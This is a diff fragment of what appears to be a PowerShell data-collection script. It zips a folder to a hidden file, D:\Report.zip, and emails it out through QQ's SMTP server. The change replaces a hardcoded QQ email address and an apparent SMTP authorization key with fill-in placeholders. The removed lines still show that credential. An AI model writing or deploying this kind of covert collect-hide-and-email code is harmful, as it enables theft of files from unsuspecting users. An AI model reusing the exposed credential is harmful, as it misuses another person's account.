@@ -2904,19 +2904,19 @@ copy-ToZip($fileSaveDir)
 
 attrib +h D:\Report.zip
 
-$SMTPServer = 'smtp.qq.com'
+$SMTPServer = 'smtp.qq.com'			#邮箱服务器
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('842617364@qq.com', 'ahuehsfugbzybfdb');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('你的邮箱地址', '你的smtp秘钥');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = '842617364@qq.com'
+$ReportEmail.From = '你的邮箱地址'
 
-$ReportEmail.To.Add('842617364@qq.com')
+$ReportEmail.To.Add('你的邮箱地址')
 
 $ReportEmail.Subject = 'Report'
 
